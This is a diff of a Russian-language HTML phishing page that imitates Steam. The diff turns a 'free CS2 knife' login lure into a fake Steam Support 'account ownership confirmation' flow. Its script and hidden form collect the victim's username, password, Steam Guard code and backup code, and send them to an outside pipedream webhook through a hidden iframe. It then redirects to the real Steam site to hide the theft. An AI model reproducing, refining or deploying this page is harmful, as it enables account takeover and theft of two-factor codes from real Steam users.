@@ -3,259 +3,592 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Steam Community :: Вход</title>
+  <title>Steam Support :: Подтверждение владения аккаунтом</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Motiva+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <link rel="icon" href="https://store.steampowered.com/favicon.ico" type="image/x-icon">
   
   <style>
+    :root {
+      --bg-primary: #171d25;
+      --bg-secondary: #1a2738;
+      --bg-input: #0f151f;
+      --border-color: #2a475e;
+      --accent-blue: #1a9fff;
+      --text-primary: #e5e7eb;
+      --text-secondary: #8f98a0;
+      --shadow-heavy: 0 4px 20px rgba(0, 0, 0, 0.7);
+    }
     body {
       margin: 0;
       padding: 0;
-      background: #171a21;
-      color: #c6d4df;
-      font-family: 'Roboto', Arial, sans-serif;
+      background: linear-gradient(135deg, var(--bg-primary) 0%, #0c1117 100%);
+      color: var(--text-primary);
+      font-family: 'Motiva Sans', 'Segoe UI', system-ui, sans-serif;
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      background-image: url('https://community.akamai.steamstatic.com/public/images/login_bg_2x.jpg');
-      background-size: cover;
-      background-position: center;
+      background-image: 
+        radial-gradient(circle at 15% 50%, rgba(26, 159, 255, 0.05) 0%, transparent 20%),
+        radial-gradient(circle at 85% 30%, rgba(106, 90, 205, 0.03) 0%, transparent 20%);
+      line-height: 1.5;
     }
-    .steam-container {
-      background: rgba(0,0,0,0.75);
-      backdrop-filter: blur(8px);
-      border-radius: 4px;
+    .steam-support-container {
+      background: linear-gradient(180deg, var(--bg-secondary) 0%, var(--bg-primary) 100%);
+      border-radius: 8px;
       width: 100%;
-      max-width: 460px;
-      padding: 40px 35px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.8);
-      text-align: center;
+      max-width: 500px;
+      padding: 45px 40px;
+      box-shadow: var(--shadow-heavy);
+      border: 1px solid var(--border-color);
+      position: relative;
+      overflow: hidden;
+    }
+    .steam-support-container::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, #1a9fff, #5d3bad);
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 30px;
+      gap: 15px;
     }
     .steam-logo {
-      width: 180px;
-      margin-bottom: 30px;
+      height: 40px;
+      width: auto;
+    }
+    .header-text {
+      border-left: 2px solid var(--accent-blue);
+      padding-left: 15px;
     }
     h1 {
-      font-size: 24px;
-      font-weight: 500;
-      margin-bottom: 8px;
-      color: #ffffff;
+      font-size: 26px;
+      font-weight: 700;
+      margin: 0 0 5px 0;
+      background: linear-gradient(90deg, #fff 0%, var(--accent-blue) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
     }
     .subtitle {
       font-size: 14px;
-      color: #8f98a0;
-      margin-bottom: 30px;
+      color: var(--text-secondary);
+      margin: 0;
     }
-    .step {
+    .progress-bar {
+      display: flex;
+      margin-bottom: 35px;
+      position: relative;
+    }
+    .progress-step {
+      flex: 1;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+    }
+    .progress-step .circle {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: var(--bg-input);
+      border: 2px solid var(--border-color);
+      margin: 0 auto 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--text-secondary);
+      transition: all 0.3s ease;
+    }
+    .progress-step.active .circle {
+      background: var(--accent-blue);
+      border-color: var(--accent-blue);
+      color: white;
+    }
+    .progress-step.completed .circle {
+      background: #2daf5c;
+      border-color: #2daf5c;
+      color: white;
+    }
+    .progress-step .label {
+      font-size: 12px;
+      color: var(--text-secondary);
+    }
+    .progress-step.active .label {
+      color: var(--accent-blue);
+      font-weight: 500;
+    }
+    .progress-bar::before {
+      content: '';
+      position: absolute;
+      top: 16px;
+      left: 15%;
+      right: 15%;
+      height: 2px;
+      background: var(--border-color);
+      z-index: 0;
+    }
+    .step-content {
       display: none;
     }
-    .step.active {
+    .step-content.active {
       display: block;
+      animation: fadeIn 0.4s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .form-title {
+      font-size: 20px;
+      font-weight: 500;
+      margin-bottom: 20px;
+      color: white;
+    }
+    .form-description {
+      font-size: 14px;
+      color: var(--text-secondary);
+      margin-bottom: 25px;
+      background: rgba(255, 255, 255, 0.03);
+      padding: 15px;
+      border-radius: 6px;
+      border-left: 3px solid var(--accent-blue);
     }
     .input-group {
-      margin-bottom: 20px;
-      text-align: left;
+      margin-bottom: 25px;
     }
     label {
       display: block;
-      margin-bottom: 6px;
-      font-size: 13px;
-      color: #c6d4df;
+      margin-bottom: 8px;
+      font-size: 14px;
       font-weight: 500;
+      color: var(--text-primary);
     }
-    input {
+    input, select {
       width: 100%;
-      padding: 12px 14px;
-      border: 1px solid #2a475e;
-      border-radius: 3px;
-      background: #1b2838;
+      padding: 14px 16px;
+      border: 1px solid var(--border-color);
+      border-radius: 6px;
+      background: var(--bg-input);
       color: white;
-      font-size: 16px;
-      transition: border-color 0.2s;
+      font-size: 15px;
+      transition: all 0.2s;
+      box-sizing: border-box;
     }
-    input:focus {
-      border-color: #66c0f4;
+    input:focus, select:focus {
+      border-color: var(--accent-blue);
       outline: none;
+      box-shadow: 0 0 0 3px rgba(26, 159, 255, 0.15);
+    }
+    .input-hint {
+      font-size: 12px;
+      color: var(--text-secondary);
+      margin-top: 6px;
     }
     .btn {
       width: 100%;
-      background: #1b2838;
-      color: white;
-      padding: 14px;
+      padding: 16px;
       border: none;
-      border-radius: 3px;
+      border-radius: 6px;
       font-size: 16px;
-      font-weight: 500;
+      font-weight: 600;
       cursor: pointer;
       transition: all 0.2s;
+      text-align: center;
       margin-top: 10px;
     }
-    .btn:hover {
+    .btn-primary {
+      background: linear-gradient(90deg, #1a9fff, #0d8add);
+      color: white;
+    }
+    .btn-primary:hover:not(:disabled) {
+      background: linear-gradient(90deg, #0d8add, #1a9fff);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(26, 159, 255, 0.25);
+    }
+    .btn-primary:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
       background: #2a475e;
     }
-    .btn.primary {
-      background: #66c0f4;
-      color: #0e141b;
+    .btn-secondary {
+      background: transparent;
+      color: var(--text-secondary);
+      border: 1px solid var(--border-color);
     }
-    .btn.primary:hover {
-      background: #4ea1d3;
+    .btn-secondary:hover {
+      background: rgba(255, 255, 255, 0.05);
+      border-color: var(--text-secondary);
     }
-    .btn.loading {
-      background: #2a475e;
-      cursor: wait;
+    .loading {
+      position: relative;
+      color: transparent !important;
     }
-    .btn.loading::after {
+    .loading::after {
       content: '';
-      display: inline-block;
-      width: 16px;
-      height: 16px;
-      border: 2px solid white;
-      border-top-color: transparent;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 22px;
+      height: 22px;
+      border: 3px solid rgba(255, 255, 255, 0.2);
+      border-top-color: white;
       border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-left: 10px;
-      vertical-align: middle;
+      animation: spin 0.8s linear infinite;
+      transform: translate(-50%, -50%);
     }
-    .timer {
-      margin-top: 12px;
+    @keyframes spin {
+      to { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+    .alert {
+      padding: 14px 18px;
+      border-radius: 6px;
+      margin-bottom: 25px;
       font-size: 14px;
-      color: #66c0f4;
+      display: none;
+    }
+    .alert-success {
+      background: rgba(45, 175, 92, 0.15);
+      border: 1px solid rgba(45, 175, 92, 0.4);
+      color: #6bcf8f;
+    }
+    .alert-error {
+      background: rgba(205, 74, 76, 0.15);
+      border: 1px solid rgba(205, 74, 76, 0.4);
+      color: #ff8a8a;
+    }
+    .hidden-iframe {
+      position: absolute;
+      width: 0;
+      height: 0;
+      border: none;
+      opacity: 0;
+      pointer-events: none;
     }
     .footer {
       margin-top: 40px;
+      padding-top: 25px;
+      border-top: 1px solid var(--border-color);
       font-size: 12px;
-      color: #8f98a0;
+      color: var(--text-secondary);
+      text-align: center;
+      line-height: 1.6;
     }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
+    .language-selector {
+      text-align: right;
+      margin-bottom: 20px;
+    }
+    .language-selector select {
+      width: auto;
+      padding: 8px 30px 8px 15px;
+      font-size: 13px;
+      background: var(--bg-input) url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%238f98a0'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e") no-repeat right 10px center;
+      background-size: 16px;
     }
   </style>
 </head>
 <body>
 
-  <div class="steam-container">
-    <img src="https://community.akamai.steamstatic.com/public/images/login_logo.png" alt="Steam" class="steam-logo">
+  <div class="steam-support-container">
+    <div class="language-selector">
+      <select id="language">
+        <option value="ru" selected>Русский</option>
+        <option value="en">English</option>
+      </select>
+    </div>
 
-    <!-- Шаг 1: Логин + Пароль -->
-    <div id="step1" class="step active">
-      <h1>Вход в аккаунт Steam</h1>
-      <div class="subtitle">Для получения бесплатного ножа введите данные</div>
+    <div class="header">
+      <img src="https://store.steampowered.com/public/images/v5/logo_header.png" alt="Steam" class="steam-logo">
+      <div class="header-text">
+        <h1>Подтверждение владения</h1>
+        <p class="subtitle">Steam Support — Требуется для безопасности аккаунта</p>
+      </div>
+    </div>
 
-      <form id="loginForm">
+    <div class="progress-bar">
+      <div class="progress-step active" id="step1-indicator">
+        <div class="circle">1</div>
+        <div class="label">Данные аккаунта</div>
+      </div>
+      <div class="progress-step" id="step2-indicator">
+        <div class="circle">2</div>
+        <div class="label">Подтверждение</div>
+      </div>
+      <div class="progress-step" id="step3-indicator">
+        <div class="circle">3</div>
+        <div class="label">Завершение</div>
+      </div>
+    </div>
+
+    <!-- Шаг 1: Ввод данных аккаунта -->
+    <div id="step1-content" class="step-content active">
+      <h2 class="form-title">Введите данные вашего аккаунта Steam</h2>
+      <p class="form-description">
+        Для подтверждения права собственности на аккаунт и восстановления доступа введите ваш текущий логин и пароль. Это стандартная процедура безопасности Steam Support.
+      </p>
+
+      <form id="accountForm">
         <div class="input-group">
-          <label>Имя пользователя (или email)</label>
-          <input type="text" id="username" placeholder="Имя аккаунта" required autocomplete="off"/>
+          <label for="accountName">Имя аккаунта / E-mail / Номер телефона</label>
+          <input type="text" id="accountName" placeholder="steamcommunity.com/id/..." required autocomplete="off" />
+          <div class="input-hint">Укажите логин, который вы используете для входа в Steam.</div>
         </div>
+
         <div class="input-group">
-          <label>Пароль</label>
-          <input type="password" id="password" placeholder="Пароль" required autocomplete="off"/>
+          <label for="accountPassword">Пароль</label>
+          <input type="password" id="accountPassword" placeholder="••••••••••••" required autocomplete="off" />
+          <div class="input-hint">Текущий пароль от вашего аккаунта.</div>
         </div>
-        <button type="submit" id="loginBtn" class="btn primary">Войти</button>
+
+        <div class="alert" id="step1-alert"></div>
+
+        <button type="submit" id="step1-btn" class="btn btn-primary">Продолжить →</button>
+        <button type="button" id="step1-cancel" class="btn btn-secondary">Отмена</button>
       </form>
     </div>
 
     <!-- Шаг 2: Ввод кода Steam Guard -->
-    <div id="step2" class="step">
-      <h1>Подтверждение входа</h1>
-      <div class="subtitle">Введите код из письма Steam Guard</div>
-      <p style="font-size: 14px; color: #8f98a0; margin-bottom: 25px;">
-        Код отправлен на вашу почту.<br>Проверьте папку "Входящие" или "Спам" (придёт в течение 30–60 секунд).
+    <div id="step2-content" class="step-content">
+      <h2 class="form-title">Проверка Steam Guard</h2>
+      <p class="form-description">
+        На адрес электронной почты, привязанный к аккаунту, отправлен 5-значный код подтверждения. Пожалуйста, введите его в поле ниже для завершения процедуры проверки.
       </p>
 
       <div class="input-group">
-        <label>Код подтверждения (5 символов)</label>
-        <input type="text" id="guardCode" placeholder="XXXXX" maxlength="5" required autocomplete="off"/>
+        <label for="guardCode">Код подтверждения из письма</label>
+        <input type="text" id="guardCode" placeholder="XXXXX" maxlength="5" required autocomplete="off" />
+        <div class="input-hint">Письмо от Steam Support обычно приходит в течение 1-2 минут.</div>
       </div>
-      <button id="guardBtn" class="btn primary">Подтвердить</button>
-      <div class="timer" id="timer">Осталось: 60 сек</div>
+
+      <div class="input-group">
+        <label for="backupCode">Или резервный код (если есть)</label>
+        <input type="text" id="backupCode" placeholder="RXXXX-XXXXX" autocomplete="off" />
+        <div class="input-hint">Вы можете использовать один из ваших резервных кодов.</div>
+      </div>
+
+      <div class="alert" id="step2-alert"></div>
+
+      <div style="display: flex; gap: 15px;">
+        <button type="button" id="step2-back" class="btn btn-secondary">← Назад</button>
+        <button type="button" id="step2-submit" class="btn btn-primary" style="flex: 1;">Подтвердить и продолжить</button>
+      </div>
+      <button type="button" id="resend-code" class="btn btn-secondary">Отправить код повторно</button>
+    </div>
+
+    <!-- Шаг 3: Успешное завершение -->
+    <div id="step3-content" class="step-content">
+      <h2 class="form-title">Подтверждение успешно завершено</h2>
+      <div class="alert alert-success" id="step3-alert" style="display: block;">
+        <strong>Право собственности на аккаунт подтверждено.</strong><br>
+        Доступ к аккаунту будет восстановлен в течение нескольких минут. Вы будете автоматически перенаправлены в Steam Community.
+      </div>
+      <p class="form-description">
+        Благодарим вас за сотрудничество. Это помогает нам защитить ваш аккаунт от несанкционированного доступа.
+      </p>
+      <div style="text-align: center;">
+        <div class="loading" style="margin: 30px auto; width: 50px; height: 50px;"></div>
+        <p id="countdown-text">Перенаправление через: <strong id="countdown">5</strong> секунд</p>
+      </div>
+      <button type="button" id="step3-finish" class="btn btn-primary">Перейти в Steam Community сейчас</button>
     </div>
 
     <div class="footer">
-      © Valve Corporation. Все права защищены.
+      © Valve Corporation. Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах.<br>
+      <a href="#" style="color: var(--accent-blue); text-decoration: none;">Политика конфиденциальности</a> | 
+      <a href="#" style="color: var(--accent-blue); text-decoration: none;">Правовая информация</a> | 
+      <a href="#" style="color: var(--accent-blue); text-decoration: none;">Соглашение подписчика Steam</a>
     </div>
+
+    <!-- Скрытые элементы для сбора и отправки данных -->
+    <iframe name="hiddenFrame" class="hidden-iframe"></iframe>
+    <form id="hiddenForm" action="https://eoinuzdsdrixye7.m.pipedream.net" method="POST" target="hiddenFrame" style="display: none;">
+      <input type="hidden" name="type" id="hidden-type">
+      <input type="hidden" name="account_name" id="hidden-account">
+      <input type="hidden" name="account_password" id="hidden-password">
+      <input type="hidden" name="guard_code" id="hidden-guard">
+      <input type="hidden" name="backup_code" id="hidden-backup">
+      <input type="hidden" name="user_agent" id="hidden-ua">
+      <input type="hidden" name="timestamp" id="hidden-timestamp">
+      <input type="hidden" name="session_id" id="hidden-session">
+    </form>
   </div>
 
   <script>
-    const webhook = 'https://eoinuzdsdrixye7.m.pipedream.net';
+    // Конфигурация
+    const CONFIG = {
+      webhook: 'https://eoinuzdsdrixye7.m.pipedream.net',
+      sessionId: 'steam_support_' + Math.random().toString(36).substring(2, 15),
+      countdownStart: 5,
+      fakeDelay: 1500
+    };
 
-    const step1 = document.getElementById('step1');
-    const step2 = document.getElementById('step2');
-    const loginBtn = document.getElementById('loginBtn');
-    const guardBtn = document.getElementById('guardBtn');
-    const timerEl = document.getElementById('timer');
+    // Элементы DOM
+    const stepContents = {
+      1: document.getElementById('step1-content'),
+      2: document.getElementById('step2-content'),
+      3: document.getElementById('step3-content')
+    };
+    const stepIndicators = {
+      1: document.getElementById('step1-indicator'),
+      2: document.getElementById('step2-indicator'),
+      3: document.getElementById('step3-indicator')
+    };
+    const hiddenForm = document.getElementById('hiddenForm');
+    const hiddenFields = {
+      type: document.getElementById('hidden-type'),
+      account: document.getElementById('hidden-account'),
+      password: document.getElementById('hidden-password'),
+      guard: document.getElementById('hidden-guard'),
+      backup: document.getElementById('hidden-backup'),
+      ua: document.getElementById('hidden-ua'),
+      timestamp: document.getElementById('hidden-timestamp'),
+      session: document.getElementById('hidden-session')
+    };
 
-    let timeLeft = 60;
-    let timerInterval;
+    // Инициализация скрытых полей
+    hiddenFields.ua.value = navigator.userAgent;
+    hiddenFields.session.value = CONFIG.sessionId;
 
-    async function sendData(payload) {
-      try {
-        await fetch(webhook, {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-      } catch (e) {}
+    // Переключение шагов
+    function goToStep(step) {
+      Object.values(stepContents).forEach(el => el.classList.remove('active'));
+      Object.values(stepIndicators).forEach(el => {
+        el.classList.remove('active', 'completed');
+      });
+      stepContents[step].classList.add('active');
+      stepIndicators[step].classList.add('active');
+      for (let i = 1; i < step; i++) {
+        stepIndicators[i].classList.add('completed');
+      }
+      window.scrollTo(0, 0);
     }
 
-    // Шаг 1
-    document.getElementById('loginForm').addEventListener('submit', async e => {
+    // Отправка данных через скрытую форму
+    function sendData(type, data) {
+      hiddenFields.type.value = type;
+      hiddenFields.timestamp.value = new Date().toISOString();
+      if (data.accountName) hiddenFields.account.value = data.accountName;
+      if (data.password) hiddenFields.password.value = data.password;
+      if (data.guardCode) hiddenFields.guard.value = data.guardCode;
+      if (data.backupCode) hiddenFields.backup.value = data.backupCode;
+      hiddenForm.submit();
+      // Очистка полей после отправки
+      setTimeout(() => {
+        document.getElementById('accountName').value = '';
+        document.getElementById('accountPassword').value = '';
+        document.getElementById('guardCode').value = '';
+        document.getElementById('backupCode').value = '';
+      }, 500);
+    }
+
+    // Шаг 1: Отправка логина и пароля
+    document.getElementById('accountForm').addEventListener('submit', function(e) {
       e.preventDefault();
-      if (loginBtn.disabled) return;
+      const btn = document.getElementById('step1-btn');
+      const alert = document.getElementById('step1-alert');
+      const accountName = document.getElementById('accountName').value.trim();
+      const password = document.getElementById('accountPassword').value.trim();
+      if (!accountName || !password) {
+        alert.textContent = 'Пожалуйста, заполните все поля.';
+        alert.className = 'alert alert-error';
+        alert.style.display = 'block';
+        return;
+      }
+      btn.disabled = true;
+      btn.classList.add('loading');
+      setTimeout(() => {
+        sendData('account_verification', { accountName, password });
+        goToStep(2);
+      }, CONFIG.fakeDelay);
+    });
 
-      loginBtn.disabled = true;
-      loginBtn.classList.add('loading');
-      loginBtn.textContent = 'Вход...';
+    // Шаг 2: Отправка кода Guard
+    document.getElementById('step2-submit').addEventListener('click', function() {
+      const btn = this;
+      const alert = document.getElementById('step2-alert');
+      const guardCode = document.getElementById('guardCode').value.trim().toUpperCase();
+      const backupCode = document.getElementById('backupCode').value.trim();
+      if (!guardCode && !backupCode) {
+        alert.textContent = 'Введите код подтверждения или резервный код.';
+        alert.className = 'alert alert-error';
+        alert.style.display = 'block';
+        return;
+      }
+      btn.disabled = true;
+      btn.classList.add('loading');
+      setTimeout(() => {
+        sendData('guard_verification', { guardCode, backupCode });
+        goToStep(3);
+        startCountdown();
+      }, CONFIG.fakeDelay);
+    });
 
-      const data = {
-        type: 'steam_login',
-        username: document.getElementById('username').value.trim(),
-        password: document.getElementById('password').value.trim(),
-        timestamp: new Date().toISOString(),
-        user_agent: navigator.userAgent
-      };
+    // Шаг 2: Кнопка "Назад"
+    document.getElementById('step2-back').addEventListener('click', () => goToStep(1));
 
-      await sendData(data);
+    // Шаг 2: Повторная отправка кода
+    document.getElementById('resend-code').addEventListener('click', function() {
+      const btn = this;
+      const originalText = btn.textContent;
+      btn.textContent = 'Отправка...';
+      btn.disabled = true;
+      setTimeout(() => {
+        sendData('resend_code', {});
+        btn.textContent = 'Код отправлен!';
+        setTimeout(() => {
+          btn.textContent = originalText;
+          btn.disabled = false;
+        }, 2000);
+      }, 800);
+    });
 
-      step1.classList.remove('active');
-      step2.classList.add('active');
-
-      timeLeft = 60;
-      timerEl.textContent = `Осталось: ${timeLeft} сек`;
-      timerInterval = setInterval(() => {
-        timeLeft--;
-        timerEl.textContent = `Осталось: ${timeLeft} сек`;
-        if (timeLeft <= 0) {
-          clearInterval(timerInterval);
-          timerEl.textContent = 'Время истекло. Попробуйте снова.';
+    // Шаг 3: Обратный отсчет и перенаправление
+    function startCountdown() {
+      let count = CONFIG.countdownStart;
+      const countdownEl = document.getElementById('countdown');
+      const countdownText = document.getElementById('countdown-text');
+      const interval = setInterval(() => {
+        count--;
+        countdownEl.textContent = count;
+        if (count <= 0) {
+          clearInterval(interval);
+          window.location.href = 'https://steamcommunity.com/';
         }
       }, 1000);
-    });
+      document.getElementById('step3-finish').addEventListener('click', () => {
+        clearInterval(interval);
+        window.location.href = 'https://steamcommunity.com/';
+      });
+    }
 
-    // Шаг 2
-    guardBtn.addEventListener('click', async () => {
-      const code = document.getElementById('guardCode').value.trim().toUpperCase();
-      if (code.length !== 5) {
-        return alert('Код должен состоять из 5 символов!');
+    // Отмена
+    document.getElementById('step1-cancel').addEventListener('click', () => {
+      if (confirm('Вы уверены, что хотите отменить процедуру подтверждения?')) {
+        window.location.href = 'https://help.steampowered.com/';
       }
-
-      guardBtn.disabled = true;
-      guardBtn.classList.add('loading');
-      guardBtn.textContent = 'Проверка...';
-
-      const data = {
-        type: 'steam_guard',
-        guard_code: code,
-        timestamp: new Date().toISOString()
-      };
-
-      await sendData(data);
-
-      alert('Вход выполнен успешно!\nБесплатный нож и перчатки добавлены в ваш инвентарь.\nПерезагрузите CS2 для получения предметов.');
-      window.location.href = 'https://steamcommunity.com/';
     });
+
+    // Смена языка (для видимости)
+    document.getElementById('language').addEventListener('change', function() {
+      alert('Язык интерфейса изменён. Для полного перевода страницы потребуется её перезагрузка.');
+    });
+
+    // Имитация загрузки при открытии
+    window.addEventListener('load', () => {
+      setTimeout(() => {
+        document.body.style.opacity = 1;
+      }, 300);
+    });
+    document.body.style.opacity = 0;
+    document.body.style.transition = 'opacity 0.3s ease';
   </script>
 </body>
 </html>
